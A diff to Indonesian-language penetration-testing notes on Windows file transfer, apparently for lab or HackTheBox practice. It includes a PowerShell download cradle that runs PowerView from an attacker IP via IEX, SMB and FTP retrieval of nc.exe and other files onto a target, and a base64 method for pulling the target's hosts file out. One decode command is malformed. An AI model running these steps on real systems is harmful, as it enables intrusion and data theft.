@@ -2,7 +2,7 @@
 
 ## Windows
 
-#### Metode 1: copas dari Linux
+### Metode 1: copas dari Linux
 
 ```
 # cek dulu hash-nya di linux
@@ -18,7 +18,7 @@ cat file |base64 -w 0;echo
 Get-FileHash PATH-FILE -Algorithm md5
 ```
 
-#### Metode 2: download file dari sumber online dengan PowerShell
+### Metode 2: download file dari sumber online dengan PowerShell
 
 ```
 # metode yg bisa digunakan
@@ -53,7 +53,7 @@ Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 ```
 
-#### Metode 3: SMB download
+### Metode 3: SMB download
 
 ```
 # server SMB di komputer attacker
@@ -71,7 +71,7 @@ net use n: \\192.168.220.133\share /user:test test
 copy n:\nc.exe
 ```
 
-#### Metode 4: FTP download
+### Metode 4: FTP download
 
 ```
 # install server ftp di komp attacker
@@ -83,5 +83,35 @@ sudo python3 -m pyftpdlib --port 21
 # download dari ftp dg powershell
 (New-Object Net.WebClient).DownloadFile('ftp://<ip>/file.txt', 'C:\Users\Public\ftp-file.txt')
 
+# membuat ftp interaktif di komp target
+C:\batagor> echo open 192.168.49.128 > ftpcommand.txt
+C:\batagor> echo USER anonymous >> ftpcommand.txt
+C:\batagor> echo binary >> ftpcommand.txt
+C:\batagor> echo GET file.txt >> ftpcommand.txt
+C:\batagor> echo bye >> ftpcommand.txt
+C:\batagor> ftp -v -n -s:ftpcommand.txt
+ftp> open 192.168.49.128
+Log in with USER and PASS first.
+ftp> USER anonymous
+
+ftp> GET file.txt
+ftp> bye
+
+C:\htb>more file.txt
+Ini isi file contoh
+```
+
+### Metode 5: Upload dg encode Base64 di PowerShell
 
 ```
+# di komp target
+[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
+
+# salin hash dan paste di komp attacker (linux)
+echo ENCODED_BASE64 > base64 -d > hosts
+
+# pastikan file sama, cek hash
+```
+
+### PowerShell Web Uploads
+
